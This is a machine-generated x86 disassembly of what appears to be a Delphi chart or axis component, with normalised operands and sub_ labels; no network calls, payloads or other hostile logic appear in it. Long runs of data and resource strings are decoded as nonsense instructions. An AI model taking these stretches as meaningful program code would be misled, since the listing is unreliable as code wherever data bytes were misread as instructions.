add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push es
add [ ecx ] cl
dec eax
outsd
jb r-xdata
popad
jpe r-xdata
outsb
movsb [ edi ] fs : [ esi ]
adc [ eax ] al
js r-xdata
arpl [ ebp - 0x5c ] sp
outsb
js r-xdata
add bh bh
in al dx
stosd [ edi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5405000d ] al
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
or eax 0x63726550
outsb
je r-xdata
push 0xdc747261
sub [ ecx ] eax
push eax
cmpsd [ esi ] [ edi ]
jb r-xdata
jae r-xdata
add bh bh
int3
push ebx
outsd
jb r-xdata
push 0x6e49776f
dec esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push ebx
outsd
jne r-xdata
add [ eax ] al
or al 0x0
or al 0x53
add [ eax ] eax
adc [ eax ] al
insb
add [ eax ] al
movsb [ edi ] gs : [ esi ]
add [ 0x6b72614d ] al
jae r-xdata
inc eax
inc esi
add [ eax + eax ] ah
push esp
jl r-xdata
insb
popad
je r-xdata
add [ eax ] al
add eax 0x75430600
jb r-xdata
inc esi
add [ eax ] ch
add bh bh
jl r-xdata
inc esi
inc ecx
add [ eax - 0x59 ] dl
mov al 0x41
add [ eax + eax ] dh
add bh bh
add [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] cl
stosb [ edi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440a0009 ] al
popad
je r-xdata
outsd
jb r-xdata
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or edx [ eax + 0x61 ]
push esi
popad
insb
jne r-xdata
jae r-xdata
outsd
insb
outsd
jb r-xdata
cmp eax [ esi ]
nop
add [ eax ] al
jmp [ ebx + ebp * 4 + 0x10046 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] ah
or eax [ eax ]
or edx [ ebx + 0x65 ]
jb r-xdata
je r-xdata
outsb
add [ eax ] al
inc esi
outsd
jb r-xdata
or eax 0x69540500
je r-xdata
outsd
insb
outsd
jb r-xdata
0x46
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
inc esp
popad
je r-xdata
push ebx
movsb [ edi ] gs : [ esi ]
adc [ eax ] al
adc [ eax ] al
jo r-xdata
jb r-xdata
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500b0008 ] al
popad
arpl [ ebp + 0x3c ] sp
push eax
inc ebx
add [ eax + eax ] al
inc [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
add [ edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
inc ecx
cld
inc ecx
inc esi
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or cl [ edi + 0x6e ]
jb r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax 0x62614c58
insb
cmp al 0x46
add [ eax - 0x37010000 ] ah
stosd [ edi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
push esi
jb r-xdata
inc ecx
je r-xdata
dec edi
add [ eax + 0x410f0011 ] al
je r-xdata
arpl [ ebp + 0x8 ] sp
pop ss
inc ecx
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
mov eax 0x10046c4
add [ eax ] al
add [ ebx ] bh
push eax
or al 0xf
xchg ebp eax
rol bl 0x55
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or eax 0x65476e4f
je r-xdata
popad
insb
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070016 ] al
jb r-xdata
inc edx
outsw
jb r-xdata
inc ecx
popad
insb
jne r-xdata
ja r-xdata
outsd
jne r-xdata
outsd
inc ecx
js r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x4 ]
cmp esi [ ebx + 0xc ]
je r-xdata
mov [ eax ] esp
push esp
js r-xdata
inc edi
je r-xdata
jae r-xdata
add bh bh
loopne r-xdata
popad
jb r-xdata
add [ 0x6c436e4f ] cl
jo r-xdata
add [ eax + 0x4f0b0014 ] al
outsb
add [ eax ] al
jae r-xdata
inc ebx
insb
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x6e4f0d00
inc esp
jb r-xdata
jb r-xdata
add [ eax + 0x42100012 ] al
outsw
jae r-xdata
mov eax esi
call sub_460f34
mov [ ebx + 0xc ] esi
mov eax ebx
call sub_462288
inc edi
add al ch
test eax 0x8bfffa0f
push ebp
cld
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9454ab5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0018 ] al
outsb
insb
inc ebx
insb
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
loopne r-xdata
cmp eax [ esi ]
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ edi ] al
dec edi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
inc ecx
add [ eax - 0x47010000 ] bh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0015 ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jae r-xdata
adc [ eax ] al
pop eax
add [ eax ] al
[ edi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x580d0010 ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
mov edx esi
mov eax ebx
call sub_462244
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax [ edi + 0x10 ]
mov [ ebx + 0x10 ] eax
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x14 ]
mov edx [ edi + 0x14 ]
call sub_403f3c
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovno esp [ esi + 0x74 ]
jb r-xdata
outsb
inc ecx
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0013 ] al
sub_464b98
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x90 ] esi
mov [ edi + 0x41 ] 0x1
mov [ edi + 0x24 ] 0xa
mov [ edi + 0x4 ] 0x1
mov [ edi + 0x5 ] 0x1
mov [ edi + 0x6 ] 0x1
mov [ edi + 0x50 ] 0xa
lea edx [ edi + 0x60 ]
mov eax [ rw-data ]
call sub_405af8
mov [ edi + 0x58 ] 0x0
mov [ edi + 0x4c ] 0x1
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
call sub_460e8c
mov [ edi + 0x48 ] eax
mov [ edi + 0x8c ] 0x1
xor eax eax
mov [ edi + 0xd0 ] eax
mov ecx [ edi + 0x90 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4621a8
mov esi eax
mov [ edi + 0x30 ] esi
mov [ esi + 0x10 ] edi
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c5ac
mov [ edi + 0x7c ] eax
mov [ edi + 0x88 ] 0x4
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c5ac
mov [ edi + 0x78 ] eax
mov [ edi + 0x74 ] 0x2
mov [ edi + 0x70 ] 0x3
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c5ac
mov [ edi + 0x80 ] eax
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c554
mov [ edi + 0x3c ] eax
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c508
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x90 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0xd0 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c5fc
mov [ edi + 0x28 ] eax
mov [ edi + 0x94 ] 0x1
mov dl 0x1
mov eax edi
call sub_465214
mov [ edi + 0x68 ] 0x1
mov eax [ edi + 0x90 ]
mov eax [ eax + 0x348 ]
mov edx edi
call sub_413eec
xor eax eax
mov [ edi + 0x98 ] eax
mov [ edi + 0x9c ] eax
xor eax eax
mov [ edi + 0xa0 ] eax
mov [ edi + 0xa4 ] 0x40590000
xor eax eax
mov [ edi + 0xa8 ] eax
mov [ edi + 0xac ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_464d78
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
cmp [ esi + 0x68 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc8 ] 0x0
je r-xdata
mov ecx edi
call sub_462514
pop edi
pop esi
pop ebp
retn 0xc
cmp al 0x12
jae r-xdata
mov al 0x1
sub_464db4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] eax
mov eax [ esp ]
mov ebp [ eax + 0x90 ]
mov eax [ ebp + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov edx edi
mov eax ebp
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ esp ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebx + 0x8c ]
mov al [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebx + 0x84 ]
mov al [ eax + 0x4 ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_464e84
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x78 ]
call sub_403198
mov eax [ esi + 0x7c ]
call sub_403198
mov eax [ esi + 0x80 ]
call sub_403198
mov eax [ esi + 0x3c ]
call sub_403198
mov eax [ esi + 0x6c ]
call sub_403198
mov eax [ esi + 0x28 ]
call sub_403198
mov eax [ esi + 0x30 ]
call sub_403198
mov eax [ esi + 0x48 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_464f40
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8d ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8d ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_464fa8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xdc ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xd4 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x8d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xd8 ]
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push [ eax + 0xb4 ]
push [ eax + 0xb0 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0xbc ]
push [ eax + 0xb8 ]
call sub_464f40
pop ecx
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub ebx [ edx + 0xd4 ]
mov [ ebp - 0x2c ] ebx
fild [ ebp - 0x2c ]
fstp [ ebp - 0x18 ]
fwait
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xd8 ]
sub edx ebx
mov [ ebp - 0x2c ] edx
fild [ ebp - 0x2c ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4669c8
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push [ eax + 0xbc ]
push [ eax + 0xb8 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0xb4 ]
push [ eax + 0xb0 ]
call sub_464f40
pop ecx
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
fld [ eax + 0xb0 ]
fsub [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0xb8 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
fmul [ edx + 0xc0 ]
mov [ ebp - 0x2c ] eax
fild [ ebp - 0x2c ]
fdivp st1
fstp [ ebp - 0x18 ]
fwait
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xb8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xbc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0xd4 ]
mov [ ebp - 0x2c ] ebx
fild [ ebp - 0x2c ]
fmul [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
fild [ eax + 0xdc ]
fdivp st1
fstp [ ebp - 0x18 ]
fwait
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xd8 ]
sub eax ebx
mov [ ebp - 0x2c ] eax
fild [ ebp - 0x2c ]
fmul [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
fild [ eax + 0xdc ]
fdivp st1
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
fld [ ebp - 0x28 ]
fsub [ ebp - 0x18 ]
call sub_402958
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x20 ]
fadd [ ebp - 0x18 ]
call sub_402958
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
sub_465250
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov edi eax
push [ edi + 0xc ]
push [ edi + 0x8 ]
mov eax [ rw-data ]
push [ eax + 0x4 ]
push [ eax ]
call sub_460350
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax [ rw-data ]
push [ eax + 0x4 ]
push [ eax ]
call sub_460350
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
jle r-xdata
fld [ edi + 0xc0 ]
fdiv [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ edi + 0xc0 ]
fdiv [ esp ]
call sub_402990
mov ebx eax
cmp esi ebx
jge r-xdata
fld [ edi + 0xc0 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
cmp esi ebx
jl r-xdata
fld [ esp ]
mov eax [ rw-data ]
fcomp [ eax + 0xc0 ]
fnstsw ax
sahf
jae r-xdata
fld [ r-xdata ]
fmul [ esp ]
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call sub_460c54
fstp [ esp ]
fwait
jmp r-xdata
sub_465324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ esi ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xc0 ]
fabs
fstp [ esi ]
fwait
fld [ esi ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
push [ esi + 0x4 ]
push [ esi ]
push 0x3d719799
push 0x812dea11
call sub_460350
fstp [ esi ]
fwait
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xc0 ]
fdiv [ esi ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
fabs
fld [ r-xdata ]
fcompp
fnstsw ax
sahf
jbe r-xdata
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] 0x3ff00000
jmp r-xdata
mov [ esi ] 0x812dea11
mov [ esi + 0x4 ] 0x3d719799
jmp r-xdata
push [ esi + 0x4 ]
push [ esi ]
call sub_462648
fstp [ esi ]
fwait
fld [ ebp - 0x8 ]
call sub_402990
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x14 ]
inc ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x14 ]
jg r-xdata
push [ esi + 0x4 ]
push [ esi ]
call sub_462648
fstp [ esi ]
fwait
jmp r-xdata
sub_465430
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x812dea11
mov [ ebp - 0xc ] 0x3d719799
mov eax [ rw-data ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
push ebp
call sub_465324
pop ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_465250
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_46549c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_465518
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_465a80
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x90 ]
call sub_461614
mov esi eax
mov eax [ ebx + 0x44 ]
cmp eax 0x5a
je r-xdata
mov eax [ ebx + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_45c9c4
mov esi eax
imul esi [ ebp - 0x4 ]
cmp eax 0x10e
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46551f
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_46552c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4655a7
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_465a80
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x90 ]
call sub_461614
mov esi eax
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_45c9c4
mov esi eax
imul esi [ ebp - 0x4 ]
cmp eax 0xb4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4655ae
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_4655e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jle r-xdata
mov eax 0x1
mov edi [ ebx + 0x50 ]
test edi edi
jle r-xdata
fild [ ebx + 0xdc ]
fmul [ r-xdata ]
mov [ esp + 0x8 ] esi
fild [ esp + 0x8 ]
fdivp st1
call sub_402990
jmp r-xdata
mov [ esp + 0x8 ] edi
fild [ esp + 0x8 ]
fld [ r-xdata ]
fmulp st1
mov [ esp + 0xc ] esi
fild [ esp + 0xc ]
fmulp st1
call sub_402990
add esi eax
mov edx eax
mov eax ebx
call sub_465430
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_465660
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x8e ] 0x0
je r-xdata
push [ ebx + 0xb4 ]
push [ ebx + 0xb0 ]
mov eax ebx
call sub_46552c
push eax
push [ ebx + 0xbc ]
push [ ebx + 0xb8 ]
mov eax ebx
call sub_46552c
pop edx
call sub_460384
push [ ebx + 0xb4 ]
push [ ebx + 0xb0 ]
mov eax ebx
call sub_46549c
push eax
push [ ebx + 0xbc ]
push [ ebx + 0xb8 ]
mov eax ebx
call sub_46549c
pop edx
call sub_460384
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4655e0
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_4656e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov edx [ edi ]
mov ebx [ edx + 0xd4 ]
mov edx [ edi ]
mov esi [ edx + 0xd8 ]
mov edx [ edi ]
add [ edx + 0xd4 ] eax
mov eax [ edi ]
mov edx [ ebp - 0x4 ]
sub [ eax + 0xd8 ] edx
mov eax [ edi ]
mov eax [ eax + 0xd8 ]
mov edx [ edi ]
sub eax [ edx + 0xd4 ]
mov edx [ edi ]
mov [ edx + 0xdc ] eax
mov eax [ edi ]
mov edx ebx
call sub_464fa8
mov eax [ ebp + 0x8 ]
fstp [ eax - 0x10 ]
fwait
mov eax [ edi ]
mov edx esi
call sub_464fa8
mov eax [ ebp + 0x8 ]
fstp [ eax - 0x18 ]
fwait
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465754
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
mov eax [ ebx ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
push ebp
mov eax [ edx + 0x4 ]
mov edx [ edx + 0xc ]
call sub_4656e0
pop ecx
push ebp
mov eax [ edx ]
mov edx [ edx + 0x8 ]
call sub_4656e0
pop ecx
jmp r-xdata
mov eax [ ebx ]
fld [ eax + 0xb0 ]
mov eax [ ebx ]
fsub [ eax + 0xb8 ]
mov eax [ ebx ]
fstp [ eax + 0xc0 ]
fwait
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
lea edx [ eax + 0xb0 ]
mov eax [ ebx ]
add eax 0xb8
call sub_460394
mov eax [ ebx ]
call sub_466e44
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0xb8 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0xbc ] edx
mov eax [ ebx ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xb0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xb4 ] edx
mov eax [ ebx ]
fld [ eax + 0xb8 ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
jbe r-xdata
sub_465800
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov al [ ebx + 0x8e ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x90 ]
call sub_46d47c
fstp [ edi ]
fwait
cmp [ ebx + 0x5 ] 0x0
je r-xdata
mov al [ ebx + 0x8e ]
push eax
mov cl 0x1
mov edx ebx
mov eax [ ebx + 0x90 ]
call sub_46d47c
fstp [ esi ]
fwait
cmp [ ebx + 0x6 ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_465858
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_465800
mov eax [ ebx + 0x10 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0x14 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebx + 0x18 ]
mov [ ebx + 0xb8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0xbc ] eax
fld [ ebx + 0xb0 ]
fsub [ ebx + 0xb8 ]
fstp [ ebx + 0xc0 ]
fwait
pop ebx
retn
sub_4658a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414654
mov edi esi
mov edx [ edi + 0x28 ]
mov eax [ ebx + 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x41 ]
mov [ ebx + 0x41 ] al
mov eax [ edi + 0x44 ]
mov [ ebx + 0x44 ] eax
mov edx [ edi + 0x48 ]
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x6a ]
mov [ ebx + 0x6a ] al
mov eax [ edi + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ edi + 0x54 ]
mov [ ebx + 0x54 ] eax
mov al [ edi + 0x58 ]
mov [ ebx + 0x58 ] al
mov al [ edi + 0x4c ]
mov [ ebx + 0x4c ] al
mov edx [ edi + 0x7c ]
mov eax [ ebx + 0x7c ]
